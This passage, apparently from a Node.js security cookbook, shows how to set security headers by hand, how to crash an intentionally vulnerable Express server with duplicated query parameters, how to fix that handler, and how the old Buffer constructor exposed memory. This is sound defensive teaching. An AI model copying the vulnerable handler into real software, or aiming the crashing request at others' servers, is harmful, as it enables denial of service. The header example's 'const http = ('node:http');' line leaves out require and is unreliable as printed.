     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1005.1">$ mkdir http-app</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1006.1">$ cd http-app</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1007.1">$ touch server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1008.1">
      Add the following code to the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1009.1">
        server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1010.1">
       file:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1011.1">
const http = ('node:http');
const server = http.createServer((req, res) =&gt; {
  secureHeaders(res);
  res.end('Hello World!');
});
const secureHeaders = (res) =&gt; {
  res.setHeader('Cross-Origin-Opener-Policy', 'same-
    origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-
    origin');
  res.setHeader('Origin-Agent-Cluster', '?1');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Strict-Transport-Security', 'max-
    age=15552000; includeSubDomains');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-DNS-Prefetch-Control', 'off');
  res.setHeader('X-Download-Options', 'noopen');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-Permitted-Cross-Domain-Policies',
    'none');
  res.setHeader('X-XSS-Protection', '0');
};
server.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1012.1">
      Start
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1013.1">
       the
      </span>
     </span>
     <span class="No-Break">
      <a id="_idIndexMarker723">
      </a>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1014.1">
       server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1015.1">$ node server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1016.1">
      Rerun the
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1017.1">
       cURL
      </span>
     </em>
     <span class="koboSpan" id="kobo.1018.1">
      command and
     </span>
     <a id="_idIndexMarker724">
     </a>
     <span class="koboSpan" id="kobo.1019.1">
      observe that the headers have
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1020.1">
       been injected:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1021.1">$ curl -I http://localhost:3000</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1022.1">HTTP/1.1 200 OK</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1023.1">Cross-Origin-Opener-Policy: same-origin</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1024.1">Cross-Origin-Resource-Policy: same-origin</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1025.1">Origin-Agent-Cluster: ?1</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1026.1">Referrer-Policy: no-referrer</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1027.1">Strict-Transport-Security: max-age=15552000; includeSubDomains</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1028.1">X-Content-Type-Options: nosniff</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1029.1">X-DNS-Prefetch-Control: off</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1030.1">X-Download-Options: noopen</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1031.1">X-Frame-Options: SAMEORIGIN</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1032.1">X-Permitted-Cross-Domain-Policies: none</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1033.1">X-XSS-Protection: 0</span></strong><span class="koboSpan" id="kobo.1034.1">
Date: Wed, 10 Jul 2024 14:21:31 GMT
Connection: keep-alive
Keep-Alive: timeout=5</span></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1035.1">
     These steps demonstrate how to manually inject HTTP security headers using the Node.js core
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1036.1">
      http
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1037.1">
     module, replicating the functionality provided by the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1038.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1039.1">
     middleware.
    </span>
    <span class="koboSpan" id="kobo.1039.2">
     This example illustrates how
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1040.1">
      helmet
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1041.1">
     enhances security by setting various HTTP headers that
    </span>
    <a id="_idIndexMarker725">
    </a>
    <span class="koboSpan" id="kobo.1042.1">
     mitigate
    </span>
    <a id="_idIndexMarker726">
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1043.1">
      common vulnerabilities.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-287">
    <a id="_idTextAnchor294">
    </a>
    <span class="koboSpan" id="kobo.1044.1">
     See also
    </span>
   </h2>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.1045.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1046.1">
       Guarding against cross-site scripting
      </span>
     </em>
     <span class="koboSpan" id="kobo.1047.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1048.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1049.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1050.1">
       Preventing cross-site request forgery
      </span>
     </em>
     <span class="koboSpan" id="kobo.1051.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1052.1">
       this chapter
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-288">
    <a id="_idTextAnchor295">
    </a>
    <span class="koboSpan" id="kobo.1053.1">
     Anticipating malicious input
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.1054.1">
     One of the easiest
    </span>
    <a id="_idIndexMarker727">
    </a>
    <span class="koboSpan" id="kobo.1055.1">
     groups of vulnerabilities that hackers exploit is injection attacks, with SQL injection attacks being particularly common.
    </span>
    <span class="koboSpan" id="kobo.1055.2">
     SQL injection attacks are where an attacker injects malicious SQL into an application to delete, distort, or expose data stored in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1056.1">
      the database.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1057.1">
     If an application accepts input in any form, you need to take necessary precautions to ensure that malicious inputs cannot exploit
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1058.1">
      your application.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1059.1">
     Parameter pollution is a type of injection attack where the HTTP parameters of a web application’s HTTP endpoints are injected with specific malicious input.
    </span>
    <span class="koboSpan" id="kobo.1059.2">
     HTTP parameter pollution can be used to expose internal data or even cause a
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.1060.1">
      denial of service
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1061.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.1062.1">
      DoS
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1063.1">
     ) attack, where
    </span>
    <a id="_idIndexMarker728">
    </a>
    <span class="koboSpan" id="kobo.1064.1">
     an attacker tries to interrupt a resource and render it inaccessible to the resource’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1065.1">
      intended users.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1066.1">
     In this recipe, we’ll look at how we can protect an HTTP server against parameter pollution attacks.
    </span>
    <span class="koboSpan" id="kobo.1066.2">
     Parameter pollution attacks are where malicious input is injected into
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1067.1">
      URL parameters.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-289">
    <a id="_idTextAnchor296">
    </a>
    <span class="koboSpan" id="kobo.1068.1">
     Getting ready
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1069.1">
     In this recipe, we’ll
    </span>
    <a id="_idIndexMarker729">
    </a>
    <span class="koboSpan" id="kobo.1070.1">
     learn how to protect an Express.js server against an HTTP parameter pollution attack.
    </span>
    <span class="koboSpan" id="kobo.1070.2">
     But first, we must create this
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1071.1">
      Express.js server:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1072.1">
      Create a new directory named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1073.1">
       express-input
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1074.1">
      for this recipe and initialize the project
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1075.1">
       with
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1076.1">
        npm
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1077.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1078.1">$ mkdir express-input</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1079.1">$ cd express-input</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1080.1">$ npm init --yes</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1081.1">
      Next, we need to install the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1082.1">
       Express.js module:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1083.1">$ npm install express</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1084.1">
      Create a file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1085.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1086.1">
        server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1087.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1088.1">$ touch server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1089.1">
      Add the following code to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1090.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1091.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1091.2">
      This will create an Express.js server that is susceptible to an HTTP parameter
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1092.1">
       pollution attack:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1093.1">
const express = require('express');
const app = express();
app.get('/', (req, res) =&gt; {
  asyncWork(() =&gt; {
    const upper = (req.query.msg || '').toUpperCase();
    res.send(upper);
  });
});
const asyncWork = (callback) =&gt; {
  setTimeout(callback, 0);
};
app.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1094.1">
       Note that the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1095.1">
        asyncWork()
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1096.1">
       function is for demonstrational purposes only.
      </span>
      <span class="koboSpan" id="kobo.1096.2">
       In a real application, you could expect some asynchronous tasks to happen, such as a query to be made to a database or
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1097.1">
        external service.
       </span>
      </span>
     </p>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1098.1">
     Now that we’ve created
    </span>
    <a id="_idIndexMarker730">
    </a>
    <span class="koboSpan" id="kobo.1099.1">
     a vulnerable server, we’re ready to start this recipe, where we’ll demonstrate how to exploit this vulnerability and learn how to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1100.1">
      mitigate it.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-290">
    <a id="_idTextAnchor297">
    </a>
    <span class="koboSpan" id="kobo.1101.1">
     How to do it…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1102.1">
     So far, we’ve created an Express.js server that responds to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1103.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1104.1">
     request and handles a single parameter,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1105.1">
      msg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1106.1">
     .
    </span>
    <span class="koboSpan" id="kobo.1106.2">
     The Express.js server returns the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1107.1">
      msg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1108.1">
     value we pass it but in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1109.1">
      uppercase form:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1110.1">
      First, start
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1111.1">
       the server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1112.1">$ node server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1113.1">Server listening on port 3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1114.1">
      In a second terminal window, we should test that the server is working as expected by sending
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1115.1">
       a request:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1116.1">$ curl http://localhost:3000/\?msg\=hello</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1117.1">HELLO%</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1118.1">
      Let’s see what happens when we pass the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1119.1">
       msg
      </span>
     </strong>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1120.1">
       parameter twice:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1121.1">$ curl http://localhost:3000/\?msg\=hello\&amp;msg\=world</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1122.1">curl: (52) Empty reply from server</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1123.1">
      Now, if we go back
     </span>
     <a id="_idIndexMarker731">
     </a>
     <span class="koboSpan" id="kobo.1124.1">
      to our first terminal window, we’ll see that the server has crashed with the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1125.1">
       following error:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1126.1">Server listening on port 3000</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1127.1">/Users/bgriggs/Node.js-Cookbook/Chapter09/express-input/server.js:6</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1128.1">    const upper = (req.query.msg || '').toUpperCase();</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1129.1">                                        ^</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1130.1">TypeError: (req.query.msg || "").toUpperCase is not a function</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1131.1">    at Timeout._onTimeout (/Users/bgriggs/Node.js-Cookbook/Chapter09/express-input/server.js:6:41)</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1132.1">    at listOnTimeout (node:internal/timers:573:17)</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1133.1">    at process.processTimers (node:internal/timers:514:7)</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1134.1">Node.js v22.9.0</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1135.1">
       So, it’s possible to cause the server to crash just by sending duplicate parameters.
      </span>
      <span class="koboSpan" id="kobo.1135.2">
       This makes it fairly easy for a perpetrator to launch an effective
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1136.1">
        DoS attack.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1137.1">
      The error message states
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1138.1">
       .toUpperCase is not a function
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1139.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1139.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1140.1">
       toUpperCase()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1141.1">
      function is available on
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1142.1">
       String.prototype
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1143.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1143.2">
      This means that the value we call this function on is not of the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1144.1">
       String.prototype
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1145.1">
      type, resulting in
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1146.1">
       TypeError
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1147.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1147.2">
      This happened because the multiple
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1148.1">
       msg
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1149.1">
      values have been transformed into an array.
     </span>
     <span class="koboSpan" id="kobo.1149.2">
      To protect against this, we should add some logic so that we always take the last value of
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1150.1">
       msg
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1151.1">
      when multiple values are specified.
     </span>
     <span class="koboSpan" id="kobo.1151.2">
      Let’s add this logic to a copy of
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1152.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1153.1">
      , which we’ll
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1154.1">
       name
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1155.1">
        fixed-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1156.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1157.1">$ cp server.js fixed-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1158.1">
      Now, add the following two lines to our
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1159.1">
       asyncWork()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1160.1">
      callback function within the HTTP
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1161.1">
       GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1162.1">
      request handler.
     </span>
     <span class="koboSpan" id="kobo.1162.2">
      The first line extracts the value of
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1163.1">
       req.query.msg
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1164.1">
      to a variable named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1165.1">
       msg
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1166.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1166.2">
      The second line will use the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1167.1">
       array.pop()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1168.1">
      method to
     </span>
     <a id="_idIndexMarker732">
     </a>
     <span class="koboSpan" id="kobo.1169.1">
      override the value of
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1170.1">
       msg
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1171.1">
      with the final element
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1172.1">
       of
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1173.1">
        Array
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1174.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1175.1">
    let msg = req.query.msg;
    if (Array.isArray(msg)) msg = msg.pop();</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1176.1">
      Next, the following line needs to be updated so that it references the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1177.1">
        msg
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1178.1">
       variable:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1179.1">
    const upper = (msg || '').toUpperCase();</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1180.1">
      Start the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1181.1">
       fixed server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1182.1">$ node fixed-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1183.1">
      Now, let’s retry our request, where we pass the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1184.1">
       msg
      </span>
     </strong>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1185.1">
       parameter twice:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1186.1">$ curl http://localhost:3000/\?msg\=hello\&amp;msg\=world</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1187.1">WORLD%</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1188.1">
       Our logic to always set the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1189.1">
        msg
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1190.1">
       variable to the last value is working.
      </span>
      <span class="koboSpan" id="kobo.1190.2">
       Observe that the server no
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1191.1">
        longer crashes.
       </span>
      </span>
     </p>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1192.1">
     With that, we’ve learned how URL parameters can be exploited to cause DoS attacks and how we can add logic to our code to guard against
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1193.1">
      these attacks.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-291">
    <a id="_idTextAnchor298">
    </a>
    <span class="koboSpan" id="kobo.1194.1">
     How it works…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1195.1">
     Injection attacks are made possible when inputs aren’t sanitized appropriately.
    </span>
    <span class="koboSpan" id="kobo.1195.2">
     In this recipe, we wrongly assumed that the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1196.1">
      msg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1197.1">
     parameter would only ever be
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1198.1">
      a string.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1199.1">
     Many Node.js web frameworks support duplicate parameters in URLs, despite there being no specification on how these should
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1200.1">
      be handled.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1201.1">
     Express.js depends on the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1202.1">
      qs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1203.1">
     module for URL parameter handling.
    </span>
    <span class="koboSpan" id="kobo.1203.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1204.1">
      qs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1205.1">
     module’s approach to handling multiple parameters of the same name is to convert the duplicate names into an array.
    </span>
    <span class="koboSpan" id="kobo.1205.2">
     As demonstrated in this recipe, this conversion results in code breakages and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1206.1">
      unexpected behavior.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1207.1">
     In this recipe, our server crashed because it was trying to call the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1208.1">
      toUpperCase()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1209.1">
     function on an
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1210.1">
      Array
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1211.1">
     global object, which doesn’t exist on that type.
    </span>
    <span class="koboSpan" id="kobo.1211.2">
     This means that attackers have a very easily exploitable method of disabling servers by supplying malformed/malicious input.
    </span>
    <span class="koboSpan" id="kobo.1211.3">
     Other than enabling DoS-style attacks, not sanitizing and validating input
    </span>
    <a id="_idIndexMarker733">
    </a>
    <span class="koboSpan" id="kobo.1212.1">
     parameters can lead to XSS attacks.
    </span>
    <span class="koboSpan" id="kobo.1212.2">
     XSS attacks will be covered in more detail in the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.1213.1">
      Guarding against XSS attacks
     </span>
    </em>
    <span class="koboSpan" id="kobo.1214.1">
     recipe of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1215.1">
      this chapter.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-292">
    <a id="_idTextAnchor299">
    </a>
    <span class="koboSpan" id="kobo.1216.1">
     There’s more…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1217.1">
     Node.js
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1218.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1219.1">
     objects
    </span>
    <a id="_idIndexMarker734">
    </a>
    <span class="Annotation-reference">
    </span>
    <span class="koboSpan" id="kobo.1220.1">
     can be exploited by attackers if used incorrectly in application code.
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1221.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1222.1">
     objects represent a fixed-length series of bytes and are a subclass of JavaScript’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1223.1">
      Uint8Array()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1224.1">
     class.
    </span>
    <span class="koboSpan" id="kobo.1224.2">
     In many cases, you’ll be interacting with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1225.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1226.1">
     objects via higher-level APIs, such as using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1227.1">
      fs.readFile()
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1228.1">
     to read files.
    </span>
    <span class="koboSpan" id="kobo.1228.2">
     However, in cases where you need to interact with binary data directly, you may use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1229.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1230.1">
     objects since they provide low-level fine-grained APIs for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1231.1">
      data manipulation.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1232.1">
     In past years, a lot of attention was brought to the unsafe uses of Node.js’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1233.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1234.1">
     constructor.
    </span>
    <span class="koboSpan" id="kobo.1234.2">
     Earlier concerns about using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1235.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1236.1">
     constructor were regarding it not zero-filling new
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1237.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1238.1">
     instances, leading to the risk of sensitive data being exposed
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1239.1">
      via memory.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.1240.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.1241.1">
     All of the following examples were created via the Node.js REPL.
    </span>
    <span class="koboSpan" id="kobo.1241.2">
     The Node.js REPL can be started by entering
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1242.1">
      $ node
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1243.1">
     in your
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1244.1">
      terminal window.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1245.1">
     In Node.js 6, calling
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1246.1">
      new Buffer(int)
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1247.1">
     would create a new
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1248.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1249.1">
     object but not override any
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1250.1">
      existing memory:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1251.1">
&gt; new Buffer(10)
&lt;Buffer b7 20 00 00 00 00 00 00 00 2c&gt;</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1252.1">
     The security implications of this were recognized.
    </span>
    <span class="koboSpan" id="kobo.1252.2">
     By not overwriting the data when we initialize a new
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1253.1">
      Buffer
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1254.1">
     object, we could accidentally expose some of the previous memory.
